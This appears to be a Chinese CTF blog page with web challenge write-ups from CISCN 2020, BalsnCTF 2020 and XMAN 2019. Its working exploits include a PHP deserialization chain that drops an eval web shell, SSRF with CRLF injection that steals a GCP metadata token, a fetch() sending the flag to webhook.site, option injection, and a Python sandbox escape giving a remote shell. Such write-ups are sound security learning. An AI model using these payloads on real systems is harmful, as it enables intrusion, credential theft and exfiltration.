    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    if &quot;缓存成功&quot; in r.text:
        return True
    return False

def submit(session,cookies):
    burp0_url = &quot;http://100.100.1.5:80/ctf/notes.php&quot;
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://100.100.1.5&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://100.100.1.5/ctf/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;contents&quot;: &quot;fffffffffffffffffffffffffffffffffff&quot;, &quot;submit&quot;: &#39;&#39;}
    session.cookies = requests.utils.cookiejar_from_dict(cookies, cookiejar=None, overwrite=True)
    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data,cookies=cookies)
    return r
def sqlinj(sql):
    reg(session,sql)
    cache(session)
    cookie = session.cookies.get_dict()
    cookie[&quot;cache&quot;]=urllib.parse.quote_plus(str(base64.b64encode(b&quot;cbcisfunsoisbas\x21&quot;+base64.b64decode(urllib.parse.unquote(cookie[&quot;cache&quot;]))[16:]),encoding=&quot;ascii&quot;))
    print(cookie)
    r=submit(session,cookie)
    return r
sql=&quot;or(updatexml(1,concat(0x7e,(select upload from users where username=0x61646D696E),0x7e),1))),0x666666666666,localtime())#dd&quot;
r=sqlinj(sql)
print(r.text)
if &quot;提交成功&quot; not in r.text:
    print(r.text)</code></pre>
<p>上传名为file的文件，得到config/admin/secretpath/profile</p>
<p>结合<code>include &quot;config/${_SESSION[&#39;token&#39;]}/profile&quot;;</code>从而getshell</p>
<p>token是base64编码，因此可以精心构造出admin/secretpath</p>
<p>由于没有题目环境便无法验证</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>网络上找到了一个payload:<a href="http://igml.top/2020/08/21/2020-ciscn/" target="_blank" rel="noopener">http://igml.top/2020/08/21/2020-ciscn/</a></p>
<pre><code class="php">&lt;?php

namespace DB\Jig {
    class Mapper
    {
        protected $db;
        protected $file = &#39;gmmml.php&#39;;
        protected $document = &#39;&lt;?php @eval($_POST[gml]);?&gt;&#39;;

        function __construct($db)
        {
            $this-&gt;db = $db;
        }
    }
}

namespace DB {
    class Jig
    {
        protected $format = 0;
        protected $dir = &#39;./&#39;;
    }
}

namespace CLI {
    class Agent
    {
        protected $server;

        function __construct($server)
        {
            $this-&gt;server = $server;
        }
    }

    class WS
    {
        protected $events;

        function __construct($events)
        {
            $this-&gt;events = $events;
        }
    }
}

namespace {
    class F3
    {
        public $events;

        function __construct($events)
        {
            $this-&gt;events = $events;
        }
    }

    $a = new DB\Jig();
    $b = new DB\Jig\Mapper($a);
    $c = new F3(array(&#39;disconnect&#39; =&gt; array($b, &quot;insert&quot;)));
    $d = new CLI\Agent($c);
    $e = new CLI\WS($d);
    echo urlencode(serialize($e));

}</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/2020">https://www.ccreater.top/1970/01/01/2020</a> ciscn 华东南 web/](<a href="https://www.ccreater.top/1970/01/01/2020">https://www.ccreater.top/1970/01/01/2020</a> ciscn 华东南 web/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/" data-id="ckmn5754b0002s1ni0w3h925h" data-title="2020 ciscn 华东南 web" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020 balsn ctf web 部分题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-BalsnCTF-web-部分题解"><a href="#2020-BalsnCTF-web-部分题解" class="headerlink" title="2020 BalsnCTF web 部分题解"></a>2020 BalsnCTF web 部分题解</h1><p>文章首发于<a href="https://www.anquanke.com/post/id/222675" target="_blank" rel="noopener">安全客</a></p>
<p>题目文件：<a href="https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1utpM99xbMNCX7m7J26WedQ</a><br>提取码：v7qg </p>
<h2 id="tpc"><a href="#tpc" class="headerlink" title="tpc"></a>tpc</h2><p><a href="http://35.194.175.80:8000/" target="_blank" rel="noopener">http://35.194.175.80:8000/</a></p>
<p>题目说flag就在工作目录下并且不可以暴力猜解出文件名</p>
<p>试着file协议，发现可以任意文件读取，那么我们首先要做的是试着读取源文件</p>
<p>读取/proc/self/cmdline查看启动命令</p>
<p><code>/usr/local/bin/python /usr/local/bin/gunicorn main-dc1e2f5f7a4f359bb5ce1317a:app --bind 0.0.0.0:8000 --workers 5 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -</code></p>
<p>谷歌以下gunicorn的用法很容易知道源文件就是<code>main-dc1e2f5f7a4f359bb5ce1317a.py</code></p>
<p>再读取/proc/self/environ查看环境变量</p>
<pre><code>HOSTNAME=tpc-1PYTHON_PIP_VERSION=19.0.3SHLVL=1HOME=/home/ggGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF-8PYTHON_VERSION=3.7.2PWD=/opt/workdir</code></pre><p>于是就知道源文件在 /opt/workdir/main-dc1e2f5f7a4f359bb5ce1317a.py</p>
<pre><code class="python">import urllib.request

from flask import Flask, request

app = Flask(__name__)


@app.route(&quot;/query&quot;)
def query():
    site = request.args.get(&#39;site&#39;)
    text = urllib.request.urlopen(site).read()
    return text


@app.route(&quot;/&quot;)
def hello_world():
    return &quot;/query?site=[your website]&quot;


if __name__ == &quot;__main__&quot;:
    app.run(debug=False, host=&quot;0.0.0.0&quot;, port=8000)
</code></pre>
<p>就提供了一个很简单的ssrf功能，那么为了找到下一步的思路，就必须收集更多信息，用字典fuzz一下得到以下关键信息</p>
<p>/proc/1/net/arp</p>
<pre><code>172.17.0.4       0x1         0x0         00:00:00:00:00:00     *        docker0
172.17.0.3       0x1         0x0         00:00:00:00:00:00     *        docker0
172.17.0.2       0x1         0x2         02:42:ac:11:00:02     *        docker0
10.140.0.1       0x1         0x2         42:01:0a:8c:00:01     *        eth0</code></pre><p>/etc/hosts</p>
<pre><code># /etc/hosts: Local Host Database
#
# This file describes a number of aliases-to-address mappings for the for 
# local hosts that share this file.
#
# In the presence of the domain name service or NIS, this file may not be 
# consulted at all; see /etc/host.conf for the resolution order.
#

# IPv4 and IPv6 localhost aliases
127.0.0.1    localhost
::1        localhost

#
# Imaginary network.
#10.0.0.2               myname
#10.0.0.3               myfriend
#
# According to RFC 1918, you can use the following IP networks for private 
# nets which will never be connected to the Internet:
#
#       10.0.0.0        -   10.255.255.255
#       172.16.0.0      -   172.31.255.255
#       192.168.0.0     -   192.168.255.255
#
# In case you want to be able to connect directly to the Internet (i.e. not 
# behind a NAT, ADSL router, etc...), you need real official assigned 
# numbers.  Do not try to invent your own network numbers but instead get one 
# from your network provider (if any) or from your regional registry (ARIN, 
# APNIC, LACNIC, RIPE NCC, or AfriNIC.)
#
169.254.169.254 metadata.google.internal metadata</code></pre><p>hosts文件里面添加了一条特殊的记录，谷歌一下发现里面存放着实例的一些数据</p>
<p>直接访问<code>metadata.google.internal</code>，得到：</p>
<p><code>0.1/ computeMetadata/</code></p>
<p>继续访问下一级目录发现500了</p>
<p>阅读<a href="https://cloud.google.com/compute/docs/storing-retrieving-metadata#querying" target="_blank" rel="noopener">文档</a>得知要加入<code>Metadata-Flavor: Google</code>请求头</p>
<p>python的urlllib库之前爆出存在着CRLF的漏洞，利用这个来绕过</p>
<p><code>&quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal/PATH/%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;</code></p>
<p>写个脚本读取所有数据：</p>
<pre><code class="python">import requests

def req(parent,path):
    burp0_url = &quot;http://35.194.175.80:8000/query?site=http://metadata.google.internal&quot;+parent+path+&quot;%20HTTP/1.1%0d%0aMetadata-Flavor:%20Google%0d%0apadding:&quot;
    return requests.get(burp0_url)


def getInfo(parent,path):
    r = req(parent,path)
    if r.status_code == 500:
        return
    print(parent+path)
    print(r.text)
    print(&quot;----------------------------------------------------------------------&quot;)
    if not path.endswith(&quot;/&quot;):
        return
    child = r.text.splitlines()
    parent=parent+path
    for i in child:

        getInfo(parent,i)

getInfo(parent=&quot;&quot;,path=&quot;/&quot;)</code></pre>
<p>得到以下数据（只显示对题目有用的数据）</p>
<pre><code>...
----------------------------------------------------------------------
/computeMetadata/v1/project/project-id
balsn-ctf-2020-tpc
------------------------------------------------------------------
/computeMetadata/v1/instance/service-accounts/default/token
{&quot;access_token&quot;:&quot;ya29.c.KpcB5QdRi_ofZUDT6YcnsZrXwex0ocEfddkf1cL9qgsBVUuJI6xm7X__zkSxCc4jbw35HGJ2ZSbVUQljIKqOWbe_-q33It_9ip0sO15lH8usKPuj1I-vg2BHQeyizyWloiDf2vlRbL0EiZNaiKa3_tGFFEbxt9JrmsfYxWoN3_VOn3cqTbjNyEdj3-Xr3oQUiD0ESz0H2NS4Lg&quot;,&quot;expires_in&quot;:3147,&quot;token_type&quot;:&quot;Bearer&quot;}
----------------------------------------------------------------------
/computeMetadata/v1/instance/service-accounts/default/scopes
https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
https://www.googleapis.com/auth/servicecontrol
https://www.googleapis.com/auth/service.management.readonly
https://www.googleapis.com/auth/trace.append
----------------------------------------------------------------------
...</code></pre><p>阅读<a href="https://cloud.google.com/storage/docs" target="_blank" rel="noopener">文档</a>来了解下载存储在服务器上的数据</p>
<pre><code class="shell">#查询存储分区：
curl -X GET -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \
  &quot;https://storage.googleapis.com/storage/v1/b?project=balsn-ctf-2020-tpc&quot;

#查询存储对象
curl -X GET -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \
  &quot;https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o&quot;

#下载对象：
curl -X GET -o &quot;/tmp/obj1&quot; -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \
  &quot;https://www.googleapis.com/download/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4?generation=1605158579380048&amp;alt=media&quot;
</code></pre>
<p>将所有对象下载下来后<code>cat * | grep -a flag</code><br>获得flag路径：<code>/opt/workdir/flag-6ba72dc9ffb518f5bcd92eee.txt</code></p>
<p>BALSN{What_permissions_does_the_service_account_need}</p>
<h2 id="L5D"><a href="#L5D" class="headerlink" title="L5D"></a>L5D</h2><p>题目描述</p>
<blockquote>
<p>「Taking L5D was a profound experience, one of the most important things in my life.」</p>
<p>Try this new Unserialize-Oriented Programming System a.k.a. L5D !</p>
<p><a href="http://l5d.balsnctf.com:12345/index.php" target="_blank" rel="noopener">http://l5d.balsnctf.com:12345/index.php</a></p>
<p>PHP Version: 7.0.33</p>
<p>Author: kaibro</p>
</blockquote>
<p>题目提供了源码，阅读后发现以下可能作为关键点的地方：</p>
<p>变量覆盖：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142917.jpg" alt="image6765"></p>
<p>任意命令执行：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142948.jpg" alt="image6899"></p>
<p>修改全局变量cmd</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116143051.jpg" alt="image7035"></p>
<p>但是题目给反序列化的数据加上了一个限制：不能出现<code>*</code>(protect变量就需要<code>*</code>号)</p>
<p>实际测试一下发现，并不能用public,private的同名变量来代替protect变量，这是难点一</p>
<p>还有就是其他类的<code>__wakeup</code>方法会禁止我们通过L5D_Upload来任意变量覆盖，然后L5D_Upload又必须在其他的<code>__destruct</code>方法前执行，这是难点二</p>
<p>难点二我们可以通过最后一个调用L5D_Upload的<code>__wakeup</code>，第一个调用它的<code>__destruct</code>来绕过，因为<code>__wakeup</code>的调用顺序是从里到外，从前到后，<code>__destruct</code>的调用顺序是从外到内，从前到后，所以构造</p>
<pre><code class="php">class L5D_Upload{
    public $padding;
    public function __construct()
    {
        $this-&gt;padding = new L5D_ResetCMD();
    }

}
class L5D_ResetCMD {

    public $padding;
    protected $new_cmd = &quot;cat /flag&quot;;
    public function __construct()
    {
        $this-&gt;padding=new L5D_Command();
    }

}
class L5D_Command{
}
new L5D_Upload();</code></pre>
<p>接着就是难点一了，对<code>*</code>号的禁用导致我们不能直接反序列化一个protect属性的成员</p>
<p>但是我们可以用大写S来绕过：</p>
<p>可以利用大写S来绕过对protected,private等属性的字符检测如：</p>
<pre><code>O:12:&quot;L5D_ResetCMD&quot;:2:{s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:{}S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;}</code></pre><p>这样new_cmd就是protect属性了</p>
<p>最后的exp:</p>
<pre><code class="php">class L5D_Upload{
    public $padding;
    public function __construct()
    {
        $this-&gt;padding = new L5D_ResetCMD();
    }

}
class L5D_ResetCMD {

    public $padding;
    protected $new_cmd = &quot;cat /flag&quot;;
    public function __construct()
    {
        $this-&gt;padding=new L5D_Command();
    }

}
class L5D_Command{
}
$a=str_replace(&#39;s:10:&quot;&#39;.&quot;\x00*\x00&quot;,&#39;S:10:&quot;\00\2a\00&#39;,serialize(new L5D_Upload()));
echo urlencode ($a);
</code></pre>
<h2 id="the-woven-web"><a href="#the-woven-web" class="headerlink" title="the woven web"></a>the woven web</h2><p>看了<a href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py" target="_blank" rel="noopener">Super⚔️Blue</a> 的wp，只能说一句牛逼</p>
<p>其实原理很简单：让浏览器自动下载一个文件，然后file协议访问那个文件，那个文件就可以引用server.js，于是就有flag的值了</p>
<p>exp.py</p>
<pre><code class="python">from flask import Flask
app = Flask(__name__)

@app.route(&#39;/index.html&#39;)
def hello_world():
    r = &quot;&quot;&quot;
    &lt;html&gt;
    &lt;head&gt;
        &lt;script&gt;
            function require(a){
                if(a==&quot;express&quot;){return ()=&gt;{return {get:function(){},listen:function(){}}}
                }
                if(a==&quot;redis&quot;){
                    return {createClient:function(){}}
                }
                if(a==&quot;fs&quot;){
                    return {existsSync:function(){}};
                }
            }
        &lt;/script&gt;
        &lt;script src=&quot;../app/server.js&quot;&gt;
        &lt;/script&gt;
        &lt;script&gt;
            fetch(&quot;https://webhook.site/X?a=&quot;+FLAG);
        &lt;/script&gt;
    &lt;/head&gt;
    &lt;/html&gt;
    &quot;&quot;&quot;

    return r,{&quot;Content-Disposition&quot;:&#39;attachment; filename=&quot;wtf22.html&quot;&#39;}

if(__name__==&quot;__main__&quot;):
    app.run(&quot;0.0.0.0&quot;,4000)
</code></pre>
<h2 id="Windows-XP-Media-Player"><a href="#Windows-XP-Media-Player" class="headerlink" title="Windows XP Media Player"></a>Windows XP Media Player</h2><p>还是看了<a href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py" target="_blank" rel="noopener">Super⚔️Blue</a> 的wp</p>
<p>应该静下心来做的</p>
<pre><code class="python">import requests
import time

host = &quot;windows-xp-media-player.balsnctf.com&quot;


def req(s, path):
    return s.get(&quot;http://{}{}&quot;.format(host, path))


if __name__ == &quot;__main__&quot;:
    s1 = requests.Session()

    # create a session
    resp = req(s1, &quot;/&quot;)

    # use create playlist to generate the command `mkdir -p ./--output=/tmp/vakzz_in` 
    req(s1, &quot;/?args=-p ./--output=/tmp/vakzz_in&amp;op=create&quot;)

    # also create a `-z` folder
    req(s1, &quot;/?args=./-z&amp;op=create&quot;)

    # use `--` so that the remaining args are not treated as options, will run `ls -- -z --output=/tmp/vakzz_in /flag/`
    # since all of these folders exist ls will exit cleanly and add our args to the queue
    req(s1, &quot;/q/add?args=-- -z --output=/tmp/vakzz_in /flag/&quot;)

    # remove the `--` from the queue
    req(s1, &quot;/q/skip&quot;)

    # shuffle the queue which will run `shuf -e -z --output=/tmp/vakzz_in /flag/`
    # this writes final argument as a null terminated string to the specified output file
    req(s1, &quot;/q/shuf&quot;)

    # now /tmp/vakzz_in contains `/flag/\x00`

    # rate limit
    time.sleep(10)

    # new session as need more playlists
    s2 = requests.Session()
    resp = req(s2, &quot;/&quot;)

    # create the folder `--files0-from=/tmp/vakzz_in` for option injection
    req(s2, &quot;/?args=-p ./--files0-from=/tmp/vakzz_in&amp;op=create&quot;)

    # create the folder `--exclude=flag?[1-9]*` for option injection
    req(s2, &quot;/?args=./--exclude=flag?[1-9]*&amp;op=create&quot;)

    # now `--files0-from=/tmp/vakzz_in` and `--exclude=flag?[1-9]*` are both in the names array and can be used in args

    # use stat to run `du` with our injection options, causing it to look at folders from /tmp/vakzz_in and exclude
    # anything that matches the supplied pattern: `du -sh --files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*`
    resp = req(s2, &quot;/?args=--files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*&amp;op=stat&quot;)

    # if the flag was excluded then this will return `8.0K    /flag/` otherwise `16K    /flag/`, letting us know if 
    # the flag starts with 0-9 or a-f.
    print(resp.text.split(&#39;&lt;div class=&quot;field-row&quot;&gt;&lt;label&gt;&#39;)[2].split(&quot; &quot;)[0])</code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反序列化在禁止\x00和*时，我们可以利用大写S来绕过对protected,private等属性的字符检测如：</p>
<pre><code>O:12:&quot;L5D_ResetCMD&quot;:2:{s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:{}S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;}</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/1970/01/01/2020">https://www.ccreater.top/1970/01/01/2020</a> balsn ctf web 部分题解/](<a href="https://www.ccreater.top/1970/01/01/2020">https://www.ccreater.top/1970/01/01/2020</a> balsn ctf web 部分题解/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/1970/01/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="ckmn5754d0003s1ni0k684afb" data-title="2020 balsn ctf web 部分题解" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2019xman个人排位赛wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/1970/01/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" class="article-date">
  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/1970/01/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="escape"><a href="#escape" class="headerlink" title="escape"></a>escape</h2><p>收获:了解了python沙箱逃逸这种类型</p>
<p>getattr:对沙箱逃逸有很大作用</p>
<p>list(s)获得字符集,可以用来绕过引号限制</p>
<p>试了一下system</p>
<pre><code class="python">banned=  [&quot;&#39;&quot;, &#39;&quot;&#39;, &#39;.&#39;, &#39;reload&#39;, &#39;open&#39;, &#39;input&#39;, &#39;file&#39;, &#39;if&#39;, &#39;else&#39;, &#39;eval&#39;, &#39;exit&#39;, &#39;import&#39;, &#39;quit&#39;, &#39;exec&#39;, &#39;code&#39;, &#39;const&#39;, &#39;vars&#39;, &#39;str&#39;, &#39;chr&#39;, &#39;ord&#39;, &#39;local&#39;, &#39;global&#39;, &#39;join&#39;, &#39;format&#39;, &#39;replace&#39;, &#39;translate&#39;, &#39;try&#39;, &#39;except&#39;, &#39;with&#39;, &#39;content&#39;, &#39;frame&#39;, &#39;back&#39;]</code></pre>
<p>发现引号和点都被过滤了,不过提示说</p>
<pre><code class="python">def hello():
   os.system(&quot;echo hello&quot;)</code></pre>
<p>说明是可以通过调用system来完成,接下来就是想办法得到system函数了</p>
<p>而引号被过滤可以用字符串s里的值来绕过</p>
<pre><code class="python">#考虑这样来
a=getattr(os,&#39;system&#39;)
a(&quot;命令&quot;)</code></pre>
<pre><code class="python">def get_str(string):
    result=&#39;&#39;
    for i in string:
        result+=&#39;table[&#39;+str(table.index(i))+&#39;]+&#39;
    return result[:-1]
conn=remote(&#39;47.97.253.115&#39;,10005)
conn.sendline(&#39;table=list(s)&#39;)
conn.sendline(&#39;sys=&#39;+get_str(&#39;system&#39;))
conn.sendline(&#39;fun=getattr(os,sys)&#39;)
while 1:
        command=input(&#39;(www):$&#39;)
        new_com=&#39;fun(&#39;+get_str(command)+&#39;)&#39;
        conn.sendline(new_com)
        print(conn.recvuntil(&#39;&gt;&gt;&gt;&#39;))
conn.close()
</code></pre>
<p>flag{4EEAA88DA0B3207862D2E4876AF84A3D}</p>
<h2 id="strange-ssid"><a href="#strange-ssid" class="headerlink" title="strange_ssid"></a>strange_ssid</h2><p>这题是结束听别人讲的</p>
<p>所有的数据都是32个字符</p>
<p>所以猜测是md5加密</p>
<p>找出符合md5格式的数据</p>
<p>68dffd5a1be838b5326209714f7ea7a5</p>
<p>解密后提交flag{n3k0}失败</p>
<p>直接提交flag{68dffd5a1be838b5326209714f7ea7a5}试试</p>
<p>成功</p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a><strong>ezphp</strong></h2><p>收获:知道了curl_exec 本地文件读取</p>
<pre><code class="php">&lt;?php

class Hello {
    protected $a;

    function test() {
        $b = strpos($this-&gt;a, &#39;flag&#39;);
        if($b) {
            die(&quot;Bye!&quot;);
        }
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $this-&gt;a);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);
        echo curl_exec($c);
    }

    function __destruct(){
        $this-&gt;test();
    }
}

if (isset($_GET[&quot;z&quot;])) {
    unserialize($_GET[&quot;z&quot;]);
} else {
    highlight_file(__FILE__);
}</code></pre>
<p>curl_exec+反序列化</p>
<p>试了下本地文件读取</p>
<p>O:5:”Hello”:1:{s:1:”a”;s:27:”file://localhost/etc/passwd”;}</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwj7l0c4j30wp0ax407.jpg" alt="image1967"></p>
<p>题目过滤flag字符</p>
<p>说明我们flag就在flag文件里</p>
<p>谷歌看了好久，后来看一道又curl_exec的题目，获得了url二次编码的思路</p>
<p>最后的payload:</p>
<p><a href="http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}" target="_blank" rel="noopener">http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}</a></p>
<p>这里有一些坑就是:</p>
<ol>
<li><p>你不知道flag文件在哪个文件夹,结果最后就在根目录。。</p>
</li>
<li><p>因为是二次编码所以要注意字符串的长度</p>
</li>
</ol>
<h2 id="onion’s-secret"><a href="#onion’s-secret" class="headerlink" title="onion’s_secret"></a><strong>onion’s_secret</strong></h2><p>下载得到一个压缩包，常规的检查走一遍</p>
<p>发现onion.jpg文件尾后还有数据</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwp2ulyrj30jj079dif.jpg" alt="image2357"></p>
<p>zip格式,get一个新的加密压缩包</p>
<p>密码在hint里有提示</p>
<p>接下来就是很普通的写python了</p>
<pre><code class="python">import zipfile
def burp(filename,hint):
    password=&#39;&#39;
    i=0
    for i in range(32,128):
        password=hint.replace(&#39;?&#39;,chr(i))
        with zipfile.ZipFile(filename) as myzip:
            try :
                print(&quot;解密:&quot;+filename+&quot;:&quot;+password)
                myzip.read(&#39;onion.zip&#39;,pwd=bytes(password,encoding=&#39;ascii&#39;))
                break
                return password
            except RuntimeError: 
                print(&quot;解密失败&quot;)
            except FileNotFoundError:
                input(&#39;过来康康&#39;)
            except zipfile.zlib.error:
                print(&quot;跳过&quot;)
    if i==127:
        print(&quot;爆破失败&quot;)
        exit()
    print(&#39;爆破成功&#39;+password)
    return password

def writebyte(bbyte,filename):
    f=open(filename,&#39;wb&#39;)
    f.write(bbyte)
    f.close()
def readbyte(filename):
    f=open(filename,&#39;rb&#39;)
    bbyte=f.read()
    f.close()
    return bbyte

nullbyte=b&#39;&#39;
while 1:
    f=open(&#39;temp.txt&#39;,&#39;r&#39;)
    hint=f.read()[12:]
    f.close()
    pwd=burp(&#39;onion1.zip&#39;,hint)

    with zipfile.ZipFile(&#39;onion1.zip&#39;) as myzip:
        str=myzip.read(&#39;onion.zip&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))
        writebyte(str,&quot;temp.zip&quot;)
        str=myzip.read(&#39;hint.txt&#39;,pwd=bytes(pwd,encoding=&#39;ascii&#39;))
        writebyte(str,&quot;temp.txt&quot;)
    writebyte(readbyte(&#39;temp.zip&#39;),&#39;onion1.zip&#39;)

</code></pre>
<h2 id="commom-encrypt"><a href="#commom-encrypt" class="headerlink" title="commom_encrypt"></a><strong>commom_encrypt</strong></h2><p>读代码就完事了</p>
<pre><code class="python">def encrypt(data,groupnums):
    a=[]
    b=[]
    section=int(len(data)/groupnums)
    for i in range(0,len(data),section):
        a.append(data[i:i+section])
    for i in range(section):
        for j in range(groupnums):
            b.append(a[j][i])
    cipher=(&#39;&#39;.join(chr(ord(b[i])^i) for i in range(len(b))))
    return cipher
def decrypt(data):
    result=[]
    for i in range(1,len(data)+1):
        result.append(encrypt(data,i))
    return result

